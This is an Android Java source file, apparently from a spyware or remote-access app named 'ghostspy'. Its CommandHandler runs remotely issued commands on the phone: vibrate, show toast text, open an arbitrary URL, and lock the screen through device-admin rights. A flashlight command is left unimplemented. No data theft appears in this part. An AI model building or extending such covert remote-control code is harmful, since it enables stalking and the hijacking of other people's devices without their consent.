package com.ghostspy;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.widget.Toast;
import org.json.JSONObject;

public class CommandHandler {
    public void handle(String command, JSONObject params) {
        GhostService ctx = GhostService.getInstance();
        if (ctx == null) return;

        switch (command) {
            case "vibrate":
                Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
                else v.vibrate(1000);
                break;
            case "toast":
                String text = params != null ? params.optString("text", "Hello") : "Hello";
                android.os.Handler mainHandler = new android.os.Handler(ctx.getMainLooper());
                mainHandler.post(() -> Toast.makeText(ctx, text, Toast.LENGTH_LONG).show());
                break;
            case "flashlight":
                // Implementasi flashlight bisa ditambahkan nanti
                break;
            case "openurl":
                String url = params != null ? params.optString("url", "https://google.com") : "https://google.com";
                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
                break;
            case "lock":
                DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName comp = new ComponentName(ctx, DeviceAdminReceiver.class);
                if (dpm.isAdminActive(comp)) dpm.lockNow();
                break;
        }
    }
}
